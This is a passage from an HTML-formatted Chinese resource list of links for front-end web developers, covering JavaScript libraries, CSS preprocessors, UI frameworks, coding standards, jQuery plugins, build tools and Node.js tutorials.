href=\"http://www.cnblogs.com/snandy/archive/2012/05/22/2513652.html\">RequireJS入门（一）</a></li>\n<li><a href=\"http://www.cnblogs.com/snandy/archive/2012/05/23/2513712.html\">RequireJS入门（二）</a></li>\n<li><a href=\"http://www.cnblogs.com/snandy/archive/2012/06/08/2538001.html\">RequireJS进阶（三）</a></li>\n<li><a href=\"http://www.cnblogs.com/yexiaochai/p/3632580.html\">requrie源码学习</a></li>\n<li><a href=\"http://www.oschina.net/translate/getting-started-with-the-requirejs-library\">requrie 入门指南</a></li>\n<li><a href=\"http://www.cnblogs.com/yexiaochai/p/3214926.html\">requrieJS 学习笔记</a></li>\n<li><a href=\"http://cyj.me/why-seajs/requirejs/\">requriejs 其一 </a></li>\n<li><a href=\"http://www.cnblogs.com/yexiaochai/p/3221081.html\">require backbone结合</a></li>\n</ul>\n<h4>12. Seajs</h4>\n<ul>\n<li><a href=\"http://seajs.org/\">seajs</a></li>\n<li><a href=\"http://cyj.me/why-seajs/zh/\">seajs 中文手册</a></li>\n</ul>\n<h4>13. Less,sass</h4>\n<ul>\n<li><a href=\"http://www.w3cplus.com/sassguide/\">sass</a></li>\n<li><a href=\"http://www.sass.hk/\">sass教程-sass中国</a></li>\n<li><a href=\"http://sass.bootcss.com/\">Sass 中文文档</a></li>\n<li><a href=\"http://less.bootcss.com/\">less</a></li>\n</ul>\n<h4>14. Markdown</h4>\n<ul>\n<li><a href=\"http://wowubuntu.com/markdown/\">Markdown 语法说明 (简体中文版)</a></li>\n<li><a href=\"https://github.com/LearnShare/Learning-Markdown/blob/master/README.md\">markdown入门参考</a></li>\n<li><a href=\"https://www.gitbook.com/\">gitbook</a> 国外的在线markdown可编辑成书</li>\n<li><a href=\"https://www.zybuluo.com/mdeditor\">mdeditor</a>  一款国内的在线markdown编辑器</li>\n<li><a href=\"https://stackedit.io\">stackedit</a> 国外的在线markdown编辑器，功能强大，同步云盘</li>\n<li><a href=\"http://bh-lay.github.io/mditor/\">mditor</a> 一款轻量级的markdown编辑器</li>\n<li><a href=\"https://github.com/lepture/editor\">lepture-editor</a></li>\n<li><a href=\"https://github.com/jbt/markdown-editor\">markdown-editor</a></li>\n</ul>\n<h4>15. D3</h4>\n<ul>\n<li><a href=\"https://github.com/mbostock/d3/wiki/Tutorials\">d3 Tutorials</a></li>\n<li><a href=\"https://github.com/mbostock/d3/wiki/Gallery\">Gallery</a></li>\n<li><a href=\"http://datavisual.lofter.com/post/40cf3a_188e535\">lofter</a></li>\n<li><a href=\"http://alanland.iteye.com/blog/1878595\">iteye</a></li>\n<li><a href=\"http://javascript.ruanyifeng.com/library/d3.html\">ruanyifeng</a></li>\n</ul>\n<h4>16. 兼容性</h4>\n<ul>\n<li><a href=\"http://kangax.github.io/compat-table/es6/\">esma 兼容列表</a></li>\n<li><a href=\"http://jigsaw.w3.org/css-validator/validator.html.zh-cn\">W3C CSS验证服务</a></li>\n<li><a href=\"http://caniuse.com/#index\">caniuse</a></li>\n<li><a href=\"http://csscreator.com/properties\">csscreator</a></li>\n<li><a href=\"https://msdn.microsoft.com/zh-cn/library/cc351024(v=vs.85).aspx\">microsoft</a></li>\n<li><a href=\"http://www.responsinator.com/\">在线测兼容-移动端</a></li>\n<li><a href=\"https://www.manymo.com/emulators\">emulators</a></li>\n</ul>\n<h4>17. UI相关</h4>\n<ul>\n<li><a href=\"http://v3.bootcss.com/\">bootcss</a></li>\n<li><a href=\"http://www.w3cplus.com/MetroUICSS/\">MetroUICSS</a></li>\n<li><a href=\"http://semantic-ui.com/\">semantic</a></li>\n<li><a href=\"http://alexwolfe.github.io/Buttons/\">Buttons</a></li>\n<li><a href=\"http://hiloki.github.io/kitecss/\">kitecss</a></li>\n<li><a href=\"http://www.pintuer.com/\">pintuer</a></li>\n<li><a href=\"http://amazeui.org/\">amazeui</a></li>\n<li><a href=\"http://www.worldhello.net/gotgithub/index.html\">worldhello</a></li>\n<li><a href=\"http://igit.linuxtoy.org/contents.html\">linuxtoy</a></li>\n<li><a href=\"http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/zh_cn/\">gitmagic</a></li>\n<li><a href=\"http://rogerdudler.github.io/git-guide/index.zh.html\">rogerdudler</a></li>\n<li><a href=\"http://gitref.justjavac.com/\">gitref</a></li>\n<li><a href=\"http://git-scm.com/book/zh\">book</a></li>\n<li><a href=\"http://gogojimmy.net/2012/01/17/how-to-use-git-1-git-basic/\">gogojimmy</a></li>\n</ul>\n<h4>18. HTTP</h4>\n<ul>\n<li><a href=\"http://segmentfault.com/bookmark/1230000002521721\">HTTP API 设计指南</a></li>\n</ul>\n<h4>19. 其它API</h4>\n<ul>\n<li><a href>javascript流行库汇总</a></li>\n<li><a href=\"http://niceue.com/validator/demo/index.php\">验证api</a></li>\n<li><a href=\"http://www.css88.com/doc/underscore/\">underscore 中文手册</a></li>\n<li><a href=\"http://www.html-js.com/article/Underscorejs-source-code-analysis-of-underscorejs-source-code-analysis%203031\">underscore源码分析</a></li>\n<li><a href=\"http://yalishizhude.github.io/tags/underscore/\">underscore源码分析-亚里士朱德的博客</a></li>\n<li><a href=\"http://underscorejs.org/\">underscrejs en api</a></li>\n<li><a href=\"https://lodash.com/\">lodash - underscore的代替品</a></li>\n<li><a href=\"http://extjs-doc-cn.github.io/ext4api/\">ext4api</a></li>\n<li><a href=\"http://www.csser.com/tools/backbone/backbone.js.html\">backbone 中文手册</a></li>\n<li><a href=\"http://dev.qwrap.com/resource/js/_docs/_youa/#/qw/base/loadJs_.htm\">qwrap手册</a></li>\n<li><a href=\"http://easings.net/zh-cn\">缓动函数</a></li>\n<li><a href=\"http://www.w3school.com.cn/svg/svg_reference.asp\">svg 中文参考</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/SVG\">svg mdn参考</a></li>\n<li><a href=\"https://github.com/gabelerner/canvg\">svg 导出 canvas</a></li>\n<li><a href=\"https://github.com/exupero/saveSvgAsPng\">svg 导出 png</a></li>\n<li><a href=\"http://www.zamzar.com/convert/ai-to-svg/\">ai-to-svg</a></li>\n<li><a href=\"https://github.com/machao/localStorage\">localStorage 库</a></li>\n</ul>\n<h4>20. 图表类</h4>\n<ul>\n<li><a href=\"http://www.hcharts.cn/api/index.php\">Highcharts 中文API</a></li>\n<li><a href=\"http://api.highcharts.com/highcharts\">Highcharts 英文API</a></li>\n<li><a href=\"http://echarts.baidu.com/\">ECharts 百度的图表软件</a></li>\n<li><a href=\"http://lbs.amap.com/api/\">高德地图</a></li>\n<li><a href=\"http://paperjs.org/\">开源的矢量图脚本框架</a></li>\n<li><a href=\"http://jvectormap.com/\">svg 地图</a></li>\n</ul>\n<h4>21. vue</h4>\n<ul>\n<li><a href=\"http://cn.vuejs.org/\">Vue</a></li>\n<li><a href=\"http://forum.vuejs.org/\">Vue 论坛</a></li>\n<li><a href=\"http://www.cnblogs.com/aaronjs/p/3660102.html\">Vue 入门指南</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000000411057\">Vue 的一些资源索引</a></li>\n<li><a href></a></li>\n</ul>\n<h4>21. 正则</h4>\n<ul>\n<li><a href=\"http://segmentfault.com/a/1190000002471140\">JS正则表达式元字符</a></li>\n<li><a href=\"http://deerchao.net/tutorials/regex/regex.htm\">正则表达式30分钟入门教程</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions\">MDN-正则表达式</a></li>\n<li><a href=\"http://javascript.ruanyifeng.com/stdlib/regexp.html\">ruanyifeng - RegExp对象</a></li>\n<li><a href=\"http://div.io/topic/764?page=1\">小胡子哥 - 进阶正则表达式</a></li>\n<li><a href=\"https://github.com/Cedriking/is.js/blob/master/is.js\">is.js</a></li>\n<li><a href=\"http://regexper.com/\">正则在线测试</a></li>\n<li><a href></a></li>\n</ul>\n<h4>22. ionic</h4>\n<ul>\n<li><a href=\"https://github.com/ychow/ionic-guide\">ionic</a></li>\n</ul>\n<h4>23. 其它</h4>\n<ul>\n<li><a href=\"http://mockjs.com/\">Mock.js 是一款模拟数据生成器</a></li>\n</ul>\n<h3>七. 开发规范</h3>\n<ol>\n<li>\n<p>前端</p>\n<ul>\n<li><a href=\"http://alloyteam.github.io/CodeGuide\">通过分析github代码库总结出来的工程师代码书写习惯</a></li>\n<li><a href=\"http://codeguide.bootcss.com/\">HTML&amp;CSS编码规范 by @mdo</a></li>\n<li><a href=\"http://www.alloyteam.com/2011/10/107/\">团队合作的css命名规范-腾讯AlloyTeam前端团队</a></li>\n<li><a href=\"http://yuwenhui.github.io/\">前端编码规范之js - by yuwenhui</a></li>\n<li><a href=\"http://www.cnblogs.com/hustskyking/p/javascript-spec.html\">前端编码规范之js - by 李靖</a></li>\n<li><a href=\"http://zhibimo.com/read/Ashu/front-end-style-guide/\">前端开发规范手册</a></li>\n<li><a href=\"https://github.com/yuche/javascript#table-of-contents\">Airbnb JavaScript 编码规范（简体中文版）</a></li>\n<li><a href=\"http://www.zhihu.com/question/20351507\">AMD与CMD规范的区别</a></li>\n<li><a href=\"http://www.cnblogs.com/tugenhua0707/p/3507957.html\">AMD与CMD规范的区别</a></li>\n<li><a href=\"http://docs.kissyui.com/1.4/docs/html/tutorials/style-guide/kissy-source-style.html\">KISSY 源码规范</a></li>\n<li><a href=\"http://codeguide.bootcss.com/\">bt编码规范</a></li>\n<li><a href=\"https://github.com/Suxiaogang/Code_Guide\">规范加强版</a></li>\n<li><a href=\"http://blog.jobbole.com/79075/\">前端代码规范 及 最佳实践</a></li>\n<li><a href=\"http://coderlmn.github.io/code-standards/\">百度前端规范</a></li>\n<li><a href=\"http://isobar-idev.github.io/code-standards/\">百度前端规范</a></li>\n<li><a href=\"http://zhuanlan.zhihu.com/fuyun/19884834\">百度前端规范</a></li>\n<li><a href=\"https://github.com/gf-rd/es6-coding-style\">ECMAScript6 编码规范–广发证券前端团队</a></li>\n<li><a href=\"http://blog.jobbole.com/79484/\">JavaScript 风格指南/编码规范（Airbnb公司版）</a></li>\n<li><a href=\"http://nec.netease.com/standard\">网易前端开发规范</a></li>\n<li><a href=\"http://www.75team.com/archives/1049\">css模块</a></li>\n<li><a href=\"https://github.com/ecomfe/spec\">前端规范资源列表</a></li>\n</ul>\n</li>\n<li>\n<p>PHP</p>\n<ul>\n<li><a href=\"http://segmentfault.com/a/1190000000443795\">最流行的PHP 代码规范</a></li>\n<li><a href=\"https://github.com/hfcorriez/fig-standards/blob/zh_CN/%E6%8E%A5%E5%8F%97/PSR-2-coding-style-guide.md\">最流行的PHP 代码规范</a></li>\n</ul>\n</li>\n<li>\n<p>Android</p>\n<ul>\n<li><a href=\"http://www.cnblogs.com/lcw/p/3619181.html\">【敏捷开发】Android团队开发规范</a></li>\n<li><a href=\"http://www.jianshu.com/p/4390f4fe19b3\">Android 开发规范与应用</a></li>\n</ul>\n</li>\n</ol>\n<h3>八. 其它收集</h3>\n<h4>1. 各大公司开源项目</h4>\n<ul>\n<li><a href=\"https://code.facebook.com/projects/web/\">Facebook Projects</a></li>\n<li><a href=\"http://fex.baidu.com/\">百度web前端研发部</a></li>\n<li><a href=\"http://efe.baidu.com/\">百度EFE</a></li>\n<li><a href=\"https://github.com/fex-team/\">百度github</a></li>\n<li><a href=\"http://www.alloyteam.com/\">alloyteam</a></li>\n<li><a href=\"http://alloyteam.github.io/\">alloyteam-github</a></li>\n<li><a href=\"https://github.com/AlloyTeam/AlloyGameEngine\">alloyteam-AlloyGameEngine</a></li>\n<li><a href=\"http://alloyteam.github.io/AlloyDesigner/\">AlloyDesigner</a> 即时修改，即时保存，设计稿较正，其它开发辅助工具</li>\n<li><a href=\"http://www.alloyteam.com/2015/06/h5-jiao-hu-ye-bian-ji-qi-aeditor-jie-shao/\">H5交互页编辑器AEditor介绍</a> H5动画交互页开发的工具介绍</li>\n<li><a href=\"http://aeditor.alloyteam.com/\">AEditor</a> H5动画交互页开发的工具</li>\n<li><a href=\"http://forum.maka.im/wordpress/\">maka</a></li>\n<li><a href=\"https://github.com/fenbility/weekly-feed\">值得订阅的weekly</a></li>\n<li><a href=\"http://cube.qq.com/\">腾讯html5</a></li>\n<li><a href=\"http://75team.github.io/\">奇舞团开源项目</a></li>\n<li><a href=\"http://ued.qunar.com/\">Qunar UED</a></li>\n</ul>\n<h4>2. Javascript</h4>\n<ol>\n<li>\n<p>常用</p>\n<ul>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/2013/12/iebetter-js-make-ie6-ie8-like-modern-browser-ie9-chrome/\">ieBetter.js-让IE6-IE8拥有IE9+,Chrome等浏览器特性</a></li>\n<li><a href=\"http://mottie.github.io/Keyboard/\">模拟键盘</a></li>\n<li><a href=\"https://github.com/hotoo/pinyin\">拼音</a></li>\n<li><a href=\"https://github.com/mc-zone/IDValidator\">中国个人身份证号验证</a></li>\n</ul>\n</li>\n<li>\n<p>算法</p>\n<ul>\n<li><a href=\"https://github.com/Ralph-Wang/algorithm.in.js\">数据结构与算法 JavaScript 描述. 章节练习</a></li>\n<li><a href=\"https://github.com/twobin/twobinSort\">常见排序算法（JS版）</a></li>\n<li><a href=\"https://github.com/luofei2011/jsAgm/blob/master/js/sort.js\">经典排序</a></li>\n<li><a href=\"https://github.com/hechangmin/jssort\">常见排序算法-js版本</a></li>\n<li><a href=\"https://github.com/lightningtgc/JavaScript-Algorithms\">JavaScript 算法与数据结构 精华集</a></li>\n<li><a href=\"http://www.nowcoder.com/live/courses\">面试常考算法题精讲</a></li>\n<li><a href></a></li>\n</ul>\n</li>\n<li>\n<p>移动端</p>\n<ul>\n<li><a href=\"https://github.com/ftlabs/fastclick\">fastclick</a></li>\n<li><a href=\"https://github.com/mmastrac/jquery-noclickdelay\">no-click-delay</a></li>\n</ul>\n</li>\n<li>\n<p>JSON</p>\n<ul>\n<li><a href=\"http://beta.json-generator.com/\">模拟生成JSON数据</a></li>\n<li><a href=\"http://jsonp.afeld.me/\">返回跨域JSONAPI</a></li>\n</ul>\n</li>\n</ol>\n<h4>3. Html5</h4>\n<ul>\n<li><a href=\"http://www.zhihu.com/question/24398907\">HTML5 有哪些让你惊艳的 demo？</a></li>\n</ul>\n<h4>4. CSS</h4>\n<ul>\n<li><a href=\"http://browserhacks.com/\">browserhacks</a></li>\n<li><a href></a></li>\n</ul>\n<h4>5. jQuery</h4>\n<ol>\n<li>\n<p>焦点图</p>\n<ul>\n<li><a href=\"https://github.com/koen301/myfocus\">myfocus</a></li>\n<li><a href=\"http://www.chhua.com/myfocus/\">myfocus-官方演示站</a></li>\n<li><a href=\"http://www.superslide2.com/\">SuperSlidev2.1 – 大话主席</a></li>\n<li><a href=\"http://www.bujichong.com/sojs/soChange/index.html\">soChange</a></li>\n</ul>\n</li>\n</ol>\n<h4>6. Ext, EasyUI, J-UI 及其它各种UI方案</h4>\n<ol>\n<li>\n<p>Ext</p>\n<ul>\n<li><a href=\"https://www.sencha.com/products/extjs/\">extjs</a></li>\n<li><a href=\"http://docs.sencha.com/extjs/4.0.7/\">ext4英文api</a></li>\n<li><a href=\"http://extjs-doc-cn.github.io/ext4api/\">ext4中文api</a></li>\n<li><a href></a></li>\n</ul>\n</li>\n<li>\n<p>EasyUI</p>\n<ul>\n<li><a href=\"http://jquery-easyui.googlecode.com/svn/trunk/src/\">jquery easyui 未压缩源代码</a></li>\n</ul>\n</li>\n<li>\n<p>J-UI</p>\n<ul>\n<li><a href=\"http://jui.org/\">J-UI</a></li>\n</ul>\n</li>\n<li>\n<p>Other</p>\n<ul>\n<li><a href=\"http://dcloudio.github.io/mui/\">MUI-最接近原生APP体验的高性能前端框架</a></li>\n<li><a href=\"http://amazeui.org/\">Amaze UI | 中国首个开源 HTML5 跨屏前端框架</a></li>\n<li><a href=\"http://m.sui.taobao.org/\">淘宝 HTML5 前端框架</a></li>\n<li><a href=\"http://docs.kissyui.com/\">KISSY - 阿里前端JavaScript库</a></li>\n<li><a href=\"http://nej.netease.com/\">网易Nej - Nice Easy Javascript</a></li>\n<li><a href=\"http://demos.telerik.com/kendo-ui/mvvm/index\">Kendo UI MVVM Demo</a></li>\n<li><a href=\"http://www.bootcss.com/\">Bootstrap</a></li>\n<li><a href=\"http://smartui.chinamzz.com/\">Smart UI</a></li>\n<li><a href=\"http://developer.yahoo.com/yui/grids/\">雅虎UI - CSS UI</a></li>\n</ul>\n</li>\n</ol>\n<h4>7. 页面 社会化 分享功能</h4>\n<ul>\n<li><a href=\"http://share.baidu.com/\">百度分享</a> pc端</li>\n<li><a href=\"http://jiathis.com/\">JiaThis</a> pc端</li>\n<li><a href=\"http://developer.baidu.com/soc/share\">社会化分享组件</a> 移动端</li>\n<li><a href=\"http://www.mob.com/#/index\">ShareSDK 轻松实现社会化功能</a> 移动端</li>\n<li><a href=\"http://dev.umeng.com/social/android/quick-integration\">友盟分享</a> 移动端</li>\n</ul>\n<h4>8. 富文本编辑器</h4>\n<ul>\n<li><a href=\"http://ueditor.baidu.com/website/\">百度 ueditor</a></li>\n<li><a href=\"http://ckeditor.com/\">经典的ckeditor</a></li>\n<li><a href=\"http://kindeditor.net/\">经典的kindeditor</a></li>\n<li><a href=\"http://www.bootcss.com/p/bootstrap-wysiwyg/\">wysiwyg</a></li>\n<li><a href=\"http://integ.github.io/BachEditor/\">一个有情怀的编辑器。Bach’s Editor</a></li>\n<li><a href=\"https://github.com/mycolorway/simditor\">tower用的编辑器</a></li>\n<li><a href=\"https://github.com/summernote/summernote\">summernote 编辑器</a></li>\n<li><a href=\"http://neilj.github.io/Squire/\">html5编辑器</a></li>\n<li><a href=\"http://lab.hustlzp.com/XEditor/\">XEditor</a></li>\n<li><a href=\"https://github.com/wangfupeng1988/wangEditor\">wangEditor</a></li>\n</ul>\n<h4>9. 日历</h4>\n<ol>\n<li>\n<p>PC</p>\n<ul>\n<li><a href=\"http://www.my97.net/dp/demo/index.htm\">经典my97</a></li>\n<li><a href=\"http://www.cnblogs.com/gbin1/archive/2012/04/16/2452105.html\">强大的独立日期选择器</a></li>\n<li><a href=\"http://fullcalendar.io/\">fullcalendar</a></li>\n<li><a href=\"http://blog.csdn.net/francislaw/article/details/7740630\">fullcalendar日历控件知识点集合 </a></li>\n<li><a href=\"http://blog.sina.com.cn/s/blog_9475b1c101012c5f.html\">中文api</a></li>\n<li><a href=\"https://github.com/zzyss86/LunarCalendar\">农历日历</a></li>\n<li><a href=\"http://www.sucaisj.com/jiaoben/date/201509/16856.html\">超酷的仿百度带节日日历老黄历控件</a></li>\n<li><a href=\"http://momentjs.com/\">日期格式化</a></li>\n<li><a href=\"https://github.com/Johnqing/QPAYCalendar/\">大牛日历控件</a></li>\n<li><a href=\"https://github.com/Iamlars/dateMarker\">我群某管理作品</a></li>\n<li><a href=\"http://digitalbush.com/projects/masked-input-plugin/\">input按位替换-官网</a></li>\n<li><a href=\"https://github.com/digitalBush/jquery.maskedinput/tree/1.2.2\">input按位替换-github</a></li>\n<li><a href=\"https://github.com/dangrossman/bootstrap-daterangepicker\">bootstrap-daterangepicker</a></li>\n<li><a href=\"http://www.vandelaydesign.com/30-best-free-jquery-plugins/\">国外30个插件集合</a></li>\n<li><a href=\"http://dbushell.com/2012/10/09/pikaday-javascript-datepicker/\">JavaScript datepicker</a></li>\n<li><a href=\"http://jonthornton.github.io/Datepair.js/\">Datepair.js</a></li>\n<li><a href=\"https://github.com/glad/glDatePicker\">一个风格多样的日历</a></li>\n<li><a href=\"http://amsul.ca/pickadate.js/date/\">弹出层式的全日历</a></li>\n<li><a href=\"http://www.daterangepicker.com/\">jquery双日历</a></li>\n</ul>\n</li>\n<li>\n<p>移动</p>\n<ul>\n<li><a href=\"http://www.frankdemo.cn/index.php?c=content&amp;a=show&amp;id=115\">大气实用jQuery手机移动端日历日期选择插件</a></li>\n<li><a href=\"https://mobiscroll.com/\">jQuery Mobile 移动开发中的日期插件Mobiscroll </a></li>\n</ul>\n</li>\n</ol>\n<ol>\n<li>\n<p>Date library</p>\n<ul>\n<li><a href=\"https://github.com/datejs/Datejs\">Datejs</a></li>\n<li><a href=\"http://sugarjs.com/api/Date\">sugarjs</a></li>\n</ul>\n</li>\n</ol>\n<h4>10. 综合效果搜索平台</h4>\n<ul>\n<li><a href=\"http://www.jq22.com\">效果网</a></li>\n<li><a href=\"http://www.17sucai.com/\">17素材</a></li>\n<li><a href=\"http://microjs.com/\">常用的JavaScript代码片段</a></li>\n</ul>\n<h4>11. 前端工程化</h4>\n<ol>\n<li>\n<p>概述</p>\n<ul>\n<li><a href=\"http://www.awesomes.cn/\">前端工具大全</a></li>\n<li><a href=\"https://github.com/fouber/blog/issues/10?from=timeline&amp;isappinstalled=0#\">什么是前端工程化</a></li>\n</ul>\n</li>\n<li>\n<p>Gulp</p>\n<ul>\n<li><a href=\"http://gulpjs.com/\">Gulp官网</a></li>\n<li><a href=\"http://www.gulpjs.com.cn/\">Gulp中文网</a></li>\n<li><a href=\"https://github.com/Platform-CUF/use-gulp\">gulp资料收集</a></li>\n<li><a href=\"http://javascript.ruanyifeng.com/tool/gulp.html\">Gulp：任务自动管理工具 - ruanyifeng</a></li>\n<li><a href=\"http://gulpjs.com/plugins/\">Gulp插件</a></li>\n<li><a href=\"http://www.ido321.com/1622.html\">Gulp不完全入门教程</a></li>\n<li><a href=\"https://github.com/hjzheng/CUF_meeting_knowledge_share/issues/33\">为什么使用gulp?</a></li>\n<li><a href=\"http://www.dbpoo.com/getting-started-with-gulp/\">Gulp安装及配合组件构建前端开发一体化</a></li>\n<li><a href=\"https://github.com/nimojs/gulp-book\">Gulp 入门指南</a></li>\n<li><a href=\"https://github.com/nimojs/blog/issues/19\">Gulp 入门指南 - nimojs</a></li>\n<li><a href=\"http://markpop.github.io/2014/09/17/Gulp%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/\">Gulp入门教程</a></li>\n<li><a href=\"http://www.imooc.com/video/5692\">Gulp in Action</a></li>\n<li><a href=\"http://www.w3ctech.com/topic/134\">Gulp开发教程（翻译）</a></li>\n<li><a href=\"http://www.cnblogs.com/2050/p/4198792.html\">前端构建工具gulpjs的使用介绍及技巧</a></li>\n</ul>\n</li>\n<li>\n<p>Grunt</p>\n<ul>\n<li><a href=\"http://gruntjs.com/\">gruntjs</a></li>\n<li><a href=\"http://www.gruntjs.net/\">Grunt中文网</a></li>\n</ul>\n</li>\n<li>\n<p>Fis</p>\n<ul>\n<li><a href=\"http://fex-team.github.io/fis-site/index.html\">fis 官网</a></li>\n<li><a href=\"http://fis.baidu.com/\">fis</a></li>\n</ul>\n</li>\n</ol>\n<h4>12. 轮播图</h4>\n<ol>\n<li>\n<p>pc图轮</p>\n<ul>\n<li><a href=\"http://www.jsfoot.com/jquery/demo/2011-09-20/192.html\">单屏轮播sochange</a></li>\n<li><a href=\"http://bxslider.com/examples/carousel-demystified\">左右按钮多图切换</a></li>\n<li><a href=\"https://github.com/alvarotrigo/fullPage.js/\">fullpage全屏轮播</a></li>\n</ul>\n</li>\n<li>\n<p>移动端</p>\n<ul>\n<li><a href=\"http://www.swipejs.com/\">无缝切换</a></li>\n<li><a href=\"http://www.idangero.us/swiper/\">滑屏效果</a></li>\n<li><a href=\"https://github.com/peunzhang/fullpage\">全屏fullpage</a></li>\n<li><a href=\"https://github.com/qiqiboy/touchslider\">单个图片切换</a></li>\n<li><a href=\"https://github.com/peunzhang/slip.js\">单个全屏切换</a></li>\n<li><a href=\"http://touch.code.baidu.com/examples.html?qq-pf-to=pcqq.group\">百度的切换库</a></li>\n<li><a href=\"https://github.com/peunzhang/iSlider\">单个全屏切换</a></li>\n<li><a href=\"https://github.com/saw/touch-interfaces\">滑屏效果</a></li>\n<li><a href=\"http://baijs.com/tinycircleslider/\">旋转拖动设置</a></li>\n<li><a href=\"http://touchslider.com/\">类似于swipe切换</a></li>\n<li><a href=\"http://www.swiper.com.cn/demo/index.html\">支持多种形式的触摸滑动</a></li>\n<li><a href=\"https://github.com/joker-ye/main/blob/master/wap/index.html\">滑屏效果</a></li>\n<li><a href=\"http://www.superslide2.com/\">大话主席pc移动图片轮换</a></li>\n<li><a href=\"https://github.com/hahnzhu/parallax.js\">滑屏效果</a></li>\n<li><a href=\"https://github.com/yanhaijing/zepto.fullpage\">基于zepto的fullpage</a></li>\n<li><a href=\"http://www.cnblogs.com/plums/archive/2013/01/10/WebApp-fixed-width-layout-of-multi-terminal-adapter-since.html\">[WebApp]定宽网页设计下，固定宽度布局开发WebApp并实现多终端下WebApp布局自适应</a></li>\n<li><a href=\"http://loo2k.com/blog/detecting-wechat-client/\">判断微信客户端的那些坑</a></li>\n<li><a href=\"https://github.com/JefferyWang/nativeShare.js\">可以通过javascript直接调用原生分享的工具</a></li>\n<li><a href=\"http://www.jiathis.com/help/html/weixin-share-code\">JiaThis 分享到微信代码</a></li>\n<li><a href=\"http://fex.baidu.com/blog/2015/05/cross-mobile/\">聊聊移动端跨平台开发的各种技术</a></li>\n<li><a href=\"http://www.zhihu.com/question/29922082\">前端自动化测试</a></li>\n<li><a href=\"http://ajccom.github.io/niceslider/\">多种轮换图片</a></li>\n<li><a href=\"https://mango.github.io/slideout/\">滑动侧边栏</a></li>\n</ul>\n</li>\n</ol>\n<h4>13. 文件上传</h4>\n<ul>\n<li><a href=\"http://fex.baidu.com/webuploader/\">百度上传组件</a></li>\n<li><a href=\"https://blueimp.github.io/jQuery-File-Upload/\">上传</a></li>\n<li><a href=\"http://www.hdfu.net/\">flash 头像上传</a></li>\n<li><a href=\"http://www.dropzonejs.com/\">图片上传预览</a></li>\n<li><a href=\"http://elemefe.github.io/image-cropper/\">图片裁剪</a></li>\n<li><a href=\"http://www.shearphoto.com/\">图片裁剪-shearphoto</a></li>\n<li><a href=\"http://www.oschina.net/project/tag/284/jquery-image-tools?lang=0&amp;os=0&amp;sort=view&amp;p=2\">jQuery图片处理</a></li>\n<li><a href></a></li>\n</ul>\n<h4>14. 模拟select</h4>\n<ul>\n<li><a href=\"http://aui.github.io/popupjs/doc/selectbox.html\">糖饼 select</a></li>\n<li><a href=\"https://github.com/rmm5t/jquery-flexselect\">flexselect</a></li>\n<li><a href=\"http://loudev.com/\">双select</a></li>\n<li><a href=\"http://select2.github.io/\">select2</a></li>\n<li><a href></a></li>\n</ul>\n<h4>15. 取色插件</h4>\n<ul>\n<li><a href=\"http://www.jq22.com/plugin/367\">类似 Photoshop 的界面取色插件</a></li>\n<li><a href=\"https://github.com/jquery/jquery-color/\">jquery color</a></li>\n<li><a href=\"http://www.oschina.net/project/tag/287/color-picker\">取色插件集合</a></li>\n<li><a href=\"https://github.com/mattfarina/farbtastic\">farbtastic 圆环＋正方形</a></li>\n<li><a href></a></li>\n</ul>\n<h4>16. 城市联动</h4>\n<ul>\n<li><a href=\"http://www.ijquery.cn/?p=360\">jquery.cityselect.js基于jQuery+JSON的省市或自定义联动效果</a></li>\n<li><a href></a></li>\n</ul>\n<h4>17. 剪贴板</h4>\n<ul>\n<li><a href=\"https://github.com/zeroclipboard/zeroclipboard\">剪贴板</a></li>\n<li><a href=\"http://zenorocha.github.io/clipboard.js/\">clipboard 最新的剪切方案</a></li>\n<li><a href=\"https://github.com/zenorocha/clipboard.js\">不是Flash的剪贴板</a></li>\n</ul>\n<h4>18. 简繁转换</h4>\n<ul>\n<li><a href=\"https://github.com/BYVoid/OpenCC\">简繁转换</a></li>\n</ul>\n<h4>19. 表格 Grid</h4>\n<ul>\n<li><a href=\"http://facebook.github.io/fixed-data-table/\">facebook表格</a></li>\n<li><a href=\"http://handsontable.com/\">类似于Excel编辑表格-handsontable</a></li>\n<li><a href=\"http://bootstrap-table.wenzhixin.net.cn/\">bootstrap-table插件</a></li>\n<li><a href=\"https://www.datatables.net/\">datatables</a></li>\n</ul>\n<h4>20. 在线演示</h4>\n<ul>\n<li><a href=\"http://runjs.cn/\">js 在线编辑 - runjs</a></li>\n<li><a href=\"http://jsbin.com/\">js 在线编辑 - jsbin</a></li>\n<li><a href=\"http://codepen.io/\">js 在线编辑 - codepen</a></li>\n<li><a href=\"http://jsfiddle.net/\">js 在线编辑 - jsfiddle</a></li>\n<li><a href=\"http://ideone.com/\">java 在线编辑 - runjs</a></li>\n<li><a href=\"http://code.hcharts.cn/\">js 在线编辑 - hcharts</a></li>\n<li><a href=\"http://jsdm.com/\">js 在线编辑 - jsdm</a></li>\n<li><a href=\"http://sqlfiddle.com/\">sql 在线编辑 - sqlfiddle</a></li>\n<li><a href=\"https://thimble.mozilla.org\">mozilla 在线编辑器</a></li>\n</ul>\n<h4>21. 播放器</h4>\n<ul>\n<li><a href=\"https://github.com/zmmbreeze/DeadSimpleVideoPlayer\">Html5 VideoPlayer</a></li>\n</ul>\n<h4>22. 粒子动画</h4>\n<ul>\n<li><a href=\"http://a-jie.github.io/Proton/#example\">Proton 烟花</a></li>\n</ul>\n<h3>九. Nodejs</h3>\n<ul>\n<li><a href=\"http://liuqing.pw/\">nodejs 篇幅比较巨大</a></li>\n<li><a href=\"https://github.com/alsotang/node-lessons\">Node.js 包教不包会</a></li>\n<li><a href=\"http://www.rainweb.cn/article/category/Nodejs\">篇幅比较少</a></li>\n<li><a href=\"http://www.w3cfuns.com/article-5598538-1-1.html\">node express 入门教程</a></li>\n<li><a href=\"http://my.oschina.net/u/568264/blog/193773\">nodejs定时任务</a></li>\n<li><a href=\"http://60sky.com/\">一个nodejs博客</a></li>\n<li><a href=\"http://www.cnblogs.com/yexiaochai/p/3536547.html\">【NodeJS 学习笔记04】新闻发布系统</a></li>\n<li><a href=\"http://www.cnblogs.com/qqloving/p/3541099.html\">过年7天乐，学nodejs 也快乐</a></li>\n<li><a href=\"https://github.com/nqdeng/7-days-nodejs\">七天学会NodeJS</a></li>\n<li><a 